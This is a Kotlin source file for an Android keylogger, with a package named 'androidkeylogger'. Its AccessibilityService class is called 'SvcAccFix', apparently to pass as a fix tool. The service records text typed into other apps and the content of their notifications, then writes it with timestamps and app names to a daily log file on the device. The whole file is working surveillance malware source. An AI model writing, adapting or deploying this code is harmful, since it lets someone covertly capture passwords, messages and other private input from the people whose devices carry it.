package com.azamovhudstc.androidkeylogger

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.text.format.DateFormat
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStreamWriter
import java.text.SimpleDateFormat
import java.util.*

class SvcAccFix : AccessibilityService() {
     var child: String = ""
     var c: String = ""
     var mainData: String = ""
     var packageData: String = ""
     var f: String = ""
     var path: String? = null

    private fun createFile() {
        val file = File(path, child)
        try {
            if (!file.exists() && !file.createNewFile()) {
                throw Exception()
            }
        } catch (unused: Exception) {
        }
    }

    private fun formatDate(): String {
        return try {
            SimpleDateFormat("yyyyMMdd", Locale.getDefault()).format(Calendar.getInstance().time)
        } catch (unused: Exception) {
            ""
        }
    }

    private fun initStringBuilder() {
        val str = "\n"
        try {
            val outputStreamWriter = OutputStreamWriter(
                FileOutputStream(
                    File(path, child), true
                )
            )
            val stringBuilder = StringBuilder().apply {
                append(packageData)
                append(" ")
                append(f)
            }
            val stringBuilder2 = stringBuilder.toString()
            val stringBuilder3 = StringBuilder().apply {
                append("%")
                append(stringBuilder2.length)
                append("s")
            }
            val replace = String.format(stringBuilder3.toString(), "").replace(' ', '-')
            with(outputStreamWriter) {
                write(replace)
                write(str)
                write(stringBuilder2)
                write(str)
                write(replace)
                write(str)
                write(mainData)
                write("\n\n")
                flush()
                close()
            }
        } catch (e: Exception) {
            Log.e("apk.typingrecorder", e.message!!)
        }
    }

    fun resetData() {
        child = ""
        packageData = ""
        mainData = ""
    }

    fun writeString(): String {
        var str = ""
        if (mainData.isEmpty()) {
            return str
        }
        val stringBuilder = StringBuilder().apply {
            append(packageData)
            append(" ")
            append(f)
        }
        val stringBuilder2 = stringBuilder.toString()
        val stringBuilder3 = StringBuilder().apply {
            append("%")
            append(stringBuilder2.length)
            append("s")
        }
        str = String.format(stringBuilder3.toString(), "").replace(' ', '-')
        val result = StringBuilder().apply {
            append(str)
            append("\n")
            append(stringBuilder2)
            append("\n")
            append(str)
            append("\n")
            append(mainData)
            append("\n\n")
        }
        return result.toString()
    }

    override fun onAccessibilityEvent(accessibilityEvent: AccessibilityEvent) {
        if (accessibilityEvent != null) {
            try {
                val str = ""
                when (accessibilityEvent.eventType) {
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                        if (!(formatDate() == child || child.isEmpty())) {
                            initStringBuilder()
                            c = mainData
                            resetData()
                        }
                    }
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                        val packageName = accessibilityEvent.packageName?.toString() ?: str
                        if (packageName != getPackageName()) {
                            val stringBuilder: String = accessibilityEvent.text?.joinToString("\n") { text ->
                                (text as? CharSequence)?.takeUnless { it.toString().contains("￼") } ?: ""
                            } ?: str
                            val beforeText = accessibilityEvent.beforeText?.toString() ?: str
                            if (!(f == packageName || mainData.isEmpty())) {
                                initStringBuilder()
                                c = mainData
                                resetData()
                            }
                            if (!(mainData.isEmpty() || mainData == beforeText || mainData == c)) {
                                initStringBuilder()
                                c = mainData
                                resetData()
                            }
                            mainData = stringBuilder
                            f = packageName
                            if (!stringBuilder.isEmpty() && packageData.isEmpty()) {
                                packageData = SimpleDateFormat(
                                    DateFormat.getBestDateTimePattern(
                                        Locale.getDefault(), if (DateFormat.is24HourFormat(
                                                applicationContext
                                            )
                                        ) "Hms" else "hmsa"
                                    ), Locale.getDefault()
                                ).format(Calendar.getInstance().time)
                            }
                            if (!mainData.isEmpty() && child.isEmpty()) {
                                child = formatDate()
                                createFile()
                            }
                        }
                    }
                    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                        val packageName = accessibilityEvent.packageName?.toString() ?: str
                        if (packageName != getPackageName()) {
                            val notificationData = accessibilityEvent.text?.getOrNull(0)?.toString() ?: ""
                            if (!(mainData.isEmpty() || mainData == notificationData || mainData == c)) {
                                initStringBuilder()
                                c = mainData
                                resetData()
                                mainData = notificationData
                                f = str
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("apk.typingrecorder", e.message!!)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        path = filesDir.absolutePath
    }

    override fun onDestroy() {
        super.onDestroy()
        i = false
        h = null
    }

    override fun onInterrupt() {}

    override fun onRebind(intent: Intent) {
        super.onRebind(intent)
        i = true
        h = this
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        i = true
        h = this
        if (j) {
            j = false
            val intent = Intent(this, AccessibilityFixActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        }
    }

    override fun onUnbind(intent: Intent): Boolean {
        i = false
        h = null
        return super.onUnbind(intent)
    }

    companion object {
        var h: SvcAccFix? = null
        var i = false
        var j = false
    }
}
